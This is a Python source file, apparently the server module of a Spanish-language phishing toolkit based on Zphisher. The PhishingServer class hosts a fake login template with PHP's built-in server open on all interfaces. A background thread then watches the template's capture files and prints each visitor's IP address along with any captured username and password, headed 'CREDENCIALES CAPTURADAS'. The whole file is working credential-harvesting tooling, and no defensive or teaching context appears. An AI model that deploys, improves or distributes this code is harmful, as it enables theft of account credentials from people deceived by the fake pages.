# core/server.py

import subprocess
import os
import time
import threading
import re
from datetime import datetime
from utils.colors import Colors

class PhishingServer:
    def __init__(self):
        self.php_process = None
        self.port = 8080
        self.current_site = None
        self.running = False
        self.watching = False
        self.last_creds = ""
        self.last_ip = ""

    def start(self, site, port=8080):
        """Inicia el servidor PHP con la plantilla"""
        self.current_site = site
        self.port = port
        self.running = True

        site_path = f'templates/{site}'

        if not os.path.exists(f'{site_path}/index.php'):
            Colors.print_error(f"No se encontró index.php en {site_path}")
            return False

        for file in ['usernames.txt', 'ip.txt', 'visitor_info.txt']:
            file_path = f'{site_path}/{file}'
            if os.path.exists(file_path):
                os.remove(file_path)
                Colors.print_info(f"Archivo {file} limpiado")

        Colors.print_info(f"Iniciando servidor PHP para: {site}")
        Colors.print_info(f"Puerto: {port}")

        self.php_process = subprocess.Popen(
            ['php', '-S', f'0.0.0.0:{port}', '-t', site_path],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

        time.sleep(1)

        if self.php_process.poll() is None:
            Colors.print_success(f"Servidor PHP iniciado en http://localhost:{port}")
            self._start_watching()
            return True
        else:
            Colors.print_error("Error al iniciar servidor PHP")
            return False

    def _start_watching(self):
        """Monitorea archivos de Zphisher"""
        self.watching = True

        def watch_files():
            ip_file = f'templates/{self.current_site}/ip.txt'
            creds_file = f'templates/{self.current_site}/usernames.txt'

            while self.watching and self.running:
                if os.path.exists(ip_file):
                    with open(ip_file, 'r') as f:
                        ip = f.read().strip()
                        if ip and ip != self.last_ip:
                            self.last_ip = ip
                            self._show_visitor(ip)

                if os.path.exists(creds_file):
                    with open(creds_file, 'r') as f:
                        creds = f.read().strip()
                        if creds and creds != self.last_creds:
                            self.last_creds = creds
                           # print(f"\n[DEBUG] Contenido de usernames.txt:\n{creds}\n")
                            self._show_creds(creds)

                time.sleep(0.5)

        thread = threading.Thread(target=watch_files)
        thread.daemon = True
        thread.start()

    def _show_visitor(self, ip):
        """Muestra visitante en vivo"""
        print()
        print(Colors.colorize("┌" + "─" * 50 + "┐", Colors.BLUE))
        print(Colors.colorize("│ 🌐 NUEVO VISITANTE".ljust(52) + "│", Colors.BLUE))
        print(Colors.colorize("├" + "─" * 50 + "┤", Colors.BLUE))
        print(Colors.colorize(f"│ IP: {ip}".ljust(52) + "│", Colors.BLUE))
        print(Colors.colorize(f"│ Hora: {datetime.now().strftime('%H:%M:%S')}".ljust(52) + "│", Colors.BLUE))
        print(Colors.colorize("└" + "─" * 50 + "┘", Colors.BLUE))
        print()

    def _show_creds(self, creds):
        usuario = "Desconocido"
        password = "Desconocido"
        ip = "Desconocida"

        for line in creds.split('\n'):
            if line.startswith('Usuario:'):
                usuario = line.replace('Usuario:', '').strip()
            elif line.startswith('Contraseña:'):
                password = line.replace('Contraseña:', '').strip()
            elif line.startswith('IP:'):
                ip = line.replace('IP:', '').strip()

        # Mostrar recuadro
        print()
        print(Colors.colorize("┌" + "─" * 50 + "┐", Colors.PURPLE))
        print(Colors.colorize("│ 🔐 CREDENCIALES CAPTURADAS".ljust(52) + "│", Colors.PURPLE))
        print(Colors.colorize("├" + "─" * 50 + "┤", Colors.PURPLE))
        print(Colors.colorize(f"│ Sitio: {self.current_site}".ljust(52) + "│", Colors.BLUE))
        print(Colors.colorize("├" + "─" * 50 + "┤", Colors.PURPLE))
        print(Colors.colorize(f"│ Usuario: {usuario}".ljust(52) + "│", Colors.GREEN))
        print(Colors.colorize(f"│ Contraseña: {password}".ljust(52) + "│", Colors.RED))
        print(Colors.colorize("├" + "─" * 50 + "┤", Colors.PURPLE))
        print(Colors.colorize(f"│ IP: {ip}".ljust(52) + "│", Colors.BLUE))
        print(Colors.colorize(f"│ Hora: {datetime.now().strftime('%H:%M:%S')}".ljust(52) + "│", Colors.BLUE))
        print(Colors.colorize("└" + "─" * 50 + "┘", Colors.PURPLE))
        print()

    def wait(self):
        """Mantiene el servidor en ejecución"""
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Detiene el servidor"""
        self.running = False
        self.watching = False
        if self.php_process:
            self.php_process.terminate()
            self.php_process.wait(timeout=3)
        Colors.print_info("Servidor detenido")

    def get_urls(self):
        """Devuelve las URLs del servidor"""
        return {
            'local': f'http://localhost:{self.port}'
        }
